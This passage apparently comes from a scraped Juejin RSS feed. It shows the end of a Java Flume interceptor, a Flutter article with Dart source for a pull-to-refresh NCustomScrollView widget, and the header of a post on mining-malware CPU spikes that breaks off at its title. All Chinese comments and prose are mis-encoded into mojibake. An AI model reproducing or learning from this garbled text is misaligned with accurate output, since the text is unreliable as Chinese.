public class CustomerInterceptor implements Interceptor {

    @Override
    public void initialize() {

    }

    @Override
    public Event intercept(Event event) {
        // è¿™é‡Œæ˜¯é€æ¡å¤„ç†
        String eventBody = new String(event.getBody(), StandardCharsets.UTF_8);
        // è·å–Eventçš„Header
        Map&lt;String, String&gt; headerMap = event.getHeaders();
        // è§£æBodyè·å–JSONå­—ç¬¦ä¸²
        String[] bodyArr = eventBody.split("\\s+");
        try {
            String jsonStr = bodyArr[6];
            // è§£æJSONå­—ç¬¦ä¸²è·å–æ—¶é—´æˆ³
            JSONObject jsonObject = JSON.parseObject(jsonStr);
            String timestampStr = jsonObject.getJSONObject("app_active").getString("time");
            // å°†æ—¶é—´æˆ³è½¬æ¢å­—ç¬¦ä¸² yyyy-MM-dd
            // å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºLong
            long timestampLong = Long.parseLong(timestampStr);
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
            Instant instant = Instant.ofEpochMilli(timestampLong);
            LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());
            String date = formatter.format(localDateTime);
            // å°†è½¬æ¢åçš„å­—ç¬¦ä¸²æ”¾ç½®headerä¸­
            headerMap.put("logtime", date);
            event.setHeaders(headerMap);
        } catch (Exception e) {
            headerMap.put("logtime", "Unknown");
            event.setHeaders(headerMap);
        }
        return event;
    }

    @Override
    public List&lt;Event&gt; intercept(List&lt;Event&gt; list) {
        List&lt;Event&gt; lstEvent = new ArrayList&lt;&gt;();
        for (Event event : list) {
            Event outEvent = intercept(event);
            if (outEvent != null) {
                lstEvent.add(outEvent);
            }
        }
        return lstEvent;
    }

    @Override
    public void close() {

    }

    public static class Builder implements Interceptor.Builder {
        @Override
        public Interceptor build() {
            return new CustomerInterceptor();
        }
        @Override
        public void configure(Context context) {
        }
    }

}

</code></pre>
<h2 data-id="heading-16">å…¶ä»–ç³»åˆ—</h2>
<h3 data-id="heading-17">ğŸš€ AIç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>AIç‚¼ä¸¹æ—¥å¿—-29 - å­—èŠ‚è·³åŠ¨ DeerFlow æ·±åº¦ç ”ç©¶æ¡†<em>æ–œä½“æ ·å¼</em>æ¶ ç§æœ‰éƒ¨ç½² æµ‹è¯•ä¸Šæ‰‹ æ¶æ„ç ”ç©¶</strong>ï¼ŒæŒç»­æ‰“é€ å®ç”¨AIå·¥å…·æŒ‡å—ï¼
<strong>AIç ”ç©¶-132 Java ç”Ÿæ€å‰æ²¿ 2025ï¼šSpringã€Quarkusã€GraalVMã€CRaC ä¸äº‘åŸç”Ÿè½åœ°</strong></p>
<h3 data-id="heading-18">ğŸ’» Javaç¯‡æŒç»­æ›´æ–°ä¸­ï¼ˆé•¿æœŸæ›´æ–°ï¼‰</h3>
<p><strong>Java-218 RocketMQ Java API å®æˆ˜ï¼šåŒæ­¥/å¼‚æ­¥ Producer ä¸ Pull/Push Consumer</strong>
MyBatis å·²å®Œç»“ï¼ŒSpring å·²å®Œç»“ï¼ŒNginxå·²å®Œç»“ï¼ŒTomcatå·²å®Œç»“ï¼Œåˆ†å¸ƒå¼æœåŠ¡å·²å®Œç»“ï¼ŒDubboå·²å®Œç»“ï¼ŒMySQLå·²å®Œç»“ï¼ŒMongoDBå·²å®Œç»“ï¼ŒNeo4jå·²å®Œç»“ï¼ŒFastDFS å·²å®Œç»“ï¼ŒOSSå·²å®Œç»“ï¼ŒGuavaCacheå·²å®Œç»“ï¼ŒEVCacheå·²å®Œç»“ï¼ŒRabbitMQå·²å®Œç»“ï¼ŒRocketMQæ­£åœ¨æ›´æ–°... æ·±å…¥æµ…å‡ºåŠ©ä½ æ‰“ç‰¢åŸºç¡€ï¼</p>
<h3 data-id="heading-19">ğŸ“Š å¤§æ•°æ®æ¿å—å·²å®Œæˆå¤šé¡¹å¹²è´§æ›´æ–°ï¼ˆ300ç¯‡ï¼‰ï¼š</h3>
<p>åŒ…æ‹¬ Hadoopã€Hiveã€Kafkaã€Flinkã€ClickHouseã€Elasticsearch ç­‰äºŒåä½™é¡¹æ ¸å¿ƒç»„ä»¶ï¼Œè¦†ç›–ç¦»çº¿+å®æ—¶æ•°ä»“å…¨æ ˆï¼
<strong>å¤§æ•°æ®-278 Spark MLib - åŸºç¡€ä»‹ç» æœºå™¨å­¦ä¹ ç®—æ³• æ¢¯åº¦æå‡æ ‘ GBDTæ¡ˆä¾‹ è¯¦è§£</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView]]></title>    <link>https://juejin.cn/post/7600955777315897382</link>    <guid>https://juejin.cn/post/7600955777315897382</guid>    <pubDate>2026-01-30T13:07:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315897382" data-draft-id="7601028900885479470" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter"/> <meta itemprop="datePublished" content="2026-01-30T13:07:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SoaringHeart"/> <meta itemprop="url" content="https://juejin.cn/user/3544481219481374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutteræœ€ä½³å®è·µï¼šSliveræ—ç½‘ç»œåˆ·æ–°ç»„ä»¶NCustomScrollView
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3544481219481374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SoaringHeart
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:07:05.000Z" title="Fri Jan 30 2026 13:07:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€éœ€æ±‚æ¥æº</h2>
<p>æœ€è¿‘éœ€è¦å®ç°åµŒå¥—å’Œå¸é¡¶Headeræ»šåŠ¨ä¸‹çš„ä¸‹æ‹‰åˆ·æ–°åŠä¸Šæ‹‰åŠ è½½ã€‚æœ€ç»ˆå®ç°åŸºäº CustomScrollView çš„åˆ·æ–°è§†å›¾ç»„ä»¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3e9bb9de9014aa08abd3f7af32ccb9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29hcmluZ0hlYXJ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383372&amp;x-signature=XdLbIzqDsnlJrKiWsZpBPLZQHrE%3D" alt="simulator_screenshot_5C4883E4-F919-4FFD-BE3D-97E0BCD5C40D.png" loading="lazy"/></p>
<h2 data-id="heading-1">äºŒã€ä½¿ç”¨ç¤ºä¾‹</h2>
<pre><code class="hljs language-dart" lang="dart">Widget buildBodyNew() {
  <span class="hljs-keyword">return</span> NCustomScrollView&lt;<span class="hljs-built_in">String</span>&gt;(
    onRequest: (<span class="hljs-built_in">bool</span> isRefresh, <span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize, pres) <span class="hljs-keyword">async</span> {
      <span class="hljs-keyword">final</span> length = isRefresh ? <span class="hljs-number">0</span> : pres.length;
      <span class="hljs-keyword">final</span> list = <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt;.generate(pageSize, (i) =&gt; <span class="hljs-string">"item<span class="hljs-subst">${length + i}</span>"</span>);
      DLog.d([isRefresh, list.length]);
      <span class="hljs-keyword">return</span> list;
    },
    headerSliverBuilder: (context, <span class="hljs-built_in">bool</span> innerBoxIsScrolled) {
      <span class="hljs-keyword">return</span> [
        buildPersistentHeader(),
      ];
    },
    itemBuilder: (_, i, e) {
      <span class="hljs-keyword">return</span> ListTile(
        title: Text(<span class="hljs-string">'Item <span class="hljs-subst">$i</span>'</span>),
      );
    },
  );
}
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€æºç </h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  NCustomScrollView.dart</span>
<span class="hljs-comment">//  projects</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by shang on 2026/1/28 14:41.</span>
<span class="hljs-comment">//  Copyright Â© 2026/1/28 shang. All rights reserved.</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'package:easy_refresh/easy_refresh.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_placeholder.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_sliver_decorated.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/easy_refresh_mixin.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'</span>;

<span class="hljs-comment">/// <span class="markdown">åŸºäº CustomScrollView çš„ä¸‹æ‹‰åˆ·æ–°,ä¸Šæ‹‰åŠ è½½æ›´å¤šçš„æ»šåŠ¨åˆ—è¡¨</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> NCustomScrollView({
    <span class="hljs-keyword">super</span>.key,
    <span class="hljs-keyword">this</span>.title,
    <span class="hljs-keyword">this</span>.placeholder = <span class="hljs-keyword">const</span> NPlaceholder(),
    <span class="hljs-keyword">this</span>.contentDecoration = <span class="hljs-keyword">const</span> BoxDecoration(),
    <span class="hljs-keyword">this</span>.contentPadding = <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">0</span>),
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onRequest,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.headerSliverBuilder,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.itemBuilder,
    <span class="hljs-keyword">this</span>.separatorBuilder,
    <span class="hljs-keyword">this</span>.headerBuilder,
    <span class="hljs-keyword">this</span>.footerBuilder,
    <span class="hljs-keyword">this</span>.builder,
  });

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> title;

  <span class="hljs-keyword">final</span> Widget? placeholder;

  <span class="hljs-keyword">final</span> Decoration contentDecoration;

  <span class="hljs-keyword">final</span> EdgeInsets contentPadding;

  <span class="hljs-comment">/// <span class="markdown">è¯·æ±‚æ–¹æ³•</span></span>
  <span class="hljs-keyword">final</span> RequestListCallback&lt;T&gt; onRequest;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å¤´</span></span>
  <span class="hljs-keyword">final</span> NestedScrollViewHeaderSliversBuilder? headerSliverBuilder;

  <span class="hljs-comment">/// <span class="markdown">ListView çš„ itemBuilder</span></span>
  <span class="hljs-keyword">final</span> ValueIndexedWidgetBuilder&lt;T&gt; itemBuilder;

  <span class="hljs-keyword">final</span> IndexedWidgetBuilder? separatorBuilder;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å¤´</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? headerBuilder;

  <span class="hljs-comment">/// <span class="markdown">åˆ—è¡¨è¡¨å°¾</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? footerBuilder;

  <span class="hljs-keyword">final</span> Widget <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">List</span>&lt;T&gt; items)? builder;

  <span class="hljs-meta">@override</span>
  State&lt;NCustomScrollView&lt;T&gt;&gt; createState() =&gt; _NCustomScrollViewState&lt;T&gt;();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_NCustomScrollViewState</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;&gt;
    <span class="hljs-title">with</span> <span class="hljs-title">AutomaticKeepAliveClientMixin</span>, <span class="hljs-title">EasyRefreshMixin</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> wantKeepAlive =&gt; <span class="hljs-keyword">true</span>;

  <span class="hljs-keyword">final</span> scrollController = ScrollController();

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">late</span> RequestListCallback&lt;T&gt; onRequest = widget.onRequest;

  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">List</span>&lt;T&gt; items = &lt;T&gt;[];

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(<span class="hljs-keyword">covariant</span> NCustomScrollView&lt;T&gt; oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    <span class="hljs-keyword">if</span> (widget.title != oldWidget.title ||
        widget.placeholder != oldWidget.placeholder ||
        widget.contentDecoration != oldWidget.contentDecoration ||
        widget.contentPadding != oldWidget.contentPadding ||
        widget.onRequest != oldWidget.onRequest ||
        widget.itemBuilder != oldWidget.itemBuilder ||
        widget.separatorBuilder != oldWidget.separatorBuilder) {
      setState(() {});
    }
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">super</span>.build(context);
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> GestureDetector(onTap: onRefresh, child: Center(child: widget.placeholder));
    }

    <span class="hljs-keyword">final</span> child = EasyRefresh.builder(
      controller: refreshController,
      onRefresh: onRefresh,
      onLoad: onLoad,
      childBuilder: (_, physics) {
        <span class="hljs-keyword">return</span> CustomScrollView(
          physics: physics,
          slivers: [
            ...(widget.headerBuilder?.call(items.length) ?? []),
            buildContent(),
            ...(widget.footerBuilder?.call(items.length) ?? []),
          ],
        );
      },
    );
    <span class="hljs-keyword">if</span> (widget.headerSliverBuilder == <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">return</span> child;
    }

    <span class="hljs-keyword">return</span> NestedScrollView(
      headerSliverBuilder: widget.headerSliverBuilder!,
      body: child,
    );
  }

  Widget buildContent() {
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> SliverToBoxAdapter(child: widget.placeholder);
    }

    <span class="hljs-keyword">return</span> NSliverDecorated(
      decoration: widget.contentDecoration,
      sliver: SliverPadding(
        padding: widget.contentPadding,
        sliver: widget.builder?.call(items) ?? buildSliverList(),
      ),
    );
  }

  Widget buildSliverList() {
    <span class="hljs-keyword">return</span> SliverList.separated(
      itemBuilder: (_, i) =&gt; widget.itemBuilder(context, i, items[i]),
      separatorBuilder: (_, i) =&gt; widget.separatorBuilder?.call(context, i) ?? <span class="hljs-keyword">const</span> SizedBox(),
      itemCount: items.length,
    );
  }
}
</code></pre>
<p>æºç ï¼šEasyRefreshMixin.dart</p>
<pre><code class="hljs language-ini" lang="ini">//
//  EasyRefreshMixin.dart
//  projects
//
//  Created by shang on 2026/1/28 14:37.
//  Copyright Â© 2026/1/28 shang. All rights reserved.
//

import 'package:easy_refresh/easy_refresh.dart'<span class="hljs-comment">;</span>
import 'package:flutter/material.dart'<span class="hljs-comment">;</span>
import 'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'<span class="hljs-comment">;</span>

/// EasyRefreshåˆ·æ–° mixin
mixin EasyRefreshMixin&lt;W extends StatefulWidget, T&gt; on State&lt;W&gt; {
  late final <span class="hljs-attr">refreshController</span> = EasyRefreshController(
    controlFinishRefresh: true,
    controlFinishLoad: true,
  )<span class="hljs-comment">;</span>


  /// è¯·æ±‚æ–¹å¼
  late RequestListCallback&lt;T&gt; _onRequest<span class="hljs-comment">;</span>
  RequestListCallback&lt;T&gt; get <span class="hljs-attr">onRequest</span> =&gt; _onRequest<span class="hljs-comment">;</span>
  set onRequest(RequestListCallback&lt;T&gt; value) {
    <span class="hljs-attr">_onRequest</span> = value<span class="hljs-comment">;</span>
  }

  // æ•°æ®åˆ—è¡¨
  List&lt;T&gt; <span class="hljs-attr">_items</span> = []<span class="hljs-comment">;</span>
  List&lt;T&gt; get <span class="hljs-attr">items</span> =&gt; _items<span class="hljs-comment">;</span>
  set items(List&lt;T&gt; value) {
    <span class="hljs-attr">_items</span> = value<span class="hljs-comment">;</span>
  }

  int <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  final int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">20</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">indicator</span> = IndicatorResult.success<span class="hljs-comment">;</span>

  @override
  void dispose() {
    refreshController.dispose()<span class="hljs-comment">;</span>
    super.dispose()<span class="hljs-comment">;</span>
  }

  @override
  void initState() {
    super.initState()<span class="hljs-comment">;</span>

    WidgetsBinding.instance.addPostFrameCallback((_) {
      // DLog.d(<span class="hljs-section">[widget.title, widget.key, hashCode]</span>)<span class="hljs-comment">;</span>
      if (items.isEmpty) {
        onRefresh()<span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onRefresh() async {
    try {
      <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">true</span>, page, pageSize, &lt;T&gt;[])<span class="hljs-comment">;</span>
      items.replaceRange(0, items.length, list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishRefresh()<span class="hljs-comment">;</span>
      refreshController.resetFooter()<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishRefresh(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onLoad() async {
    if (<span class="hljs-attr">indicator</span> == IndicatorResult.noMore) {
      refreshController.finishLoad()<span class="hljs-comment">;</span>
      return<span class="hljs-comment">;</span>
    }

    try {
      final <span class="hljs-attr">start</span> = (items.length - pageSize).clamp(<span class="hljs-number">0</span>, pageSize)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">prePages</span> = items.sublist(start)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">false</span>, page, pageSize, prePages)<span class="hljs-comment">;</span>
      items.addAll(list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishLoad(indicator)<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishLoad(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }
}
</code></pre>
<h2 data-id="heading-3">æœ€åã€æ€»ç»“</h2>
<p>1ã€å½“é¡µé¢æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦å¸é¡¶æˆ–è€…åµŒå¥—æ»šåŠ¨æ—¶å°±å¿…é¡»ä½¿ç”¨ Sliver ç›¸å…³ç»„ä»¶ï¼Œå¦åˆ™ä¼šæœ‰æ»šåŠ¨è¡Œæ–‡å†²çªã€‚</p>
<p>2ã€NCustomScrollView æ”¯æŒé¡¶éƒ¨å¸é¡¶ç»„ä»¶è‡ªå®šä¹‰ï¼›åº•éƒ¨åˆ—è¡¨å¤´ï¼Œåˆ—è¡¨å°¾è®¾ç½®ï¼Œæ”¯æŒsliver è®¾ç½® Decorationã€‚</p>
<p>3ã€æ”¯æŒä¸‹æ‹‰åˆ·æ–°ï¼Œä¸Šæ‹‰åŠ è½½æ›´å¤šï¼Œä»£ç æç®€ï¼Œä½¿ç”¨æ–¹ä¾¿ã€‚</p>
<p>4ã€åˆ·æ–°é€»è¾‘å°è£…åœ¨ EasyRefreshMixin æ··å…¥é‡Œï¼Œæ–¹ä¾¿å¤šç»„ä»¶å¯å…±ç”¨ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshang1219178163%2Fflutter_templet_project%2Fblob%2Fv3.27.0%2Flib%2FbasicWidget%2Frefresh%2Fn_custom_scrollView.dart" target="_blank" title="https://github.com/shang1219178163/flutter_templet_project/blob/v3.27.0/lib/basicWidget/refresh/n_custom_scrollView.dart" ref="nofollow noopener noreferrer">github</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600955777316028454</link>    <guid>https://juejin.cn/post/7600955777316028454</guid>    <pubDate>2026-01-30T13:21:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316028454" data-draft-id="7600990891218616329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CPU é£™å‡æ˜¯æœåŠ¡å™¨è¢«æŒ–çŸ¿ç—…æ¯’æ”»å‡»æ€ä¹ˆåŠï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T13:21:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90åæ™¨ä»”"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
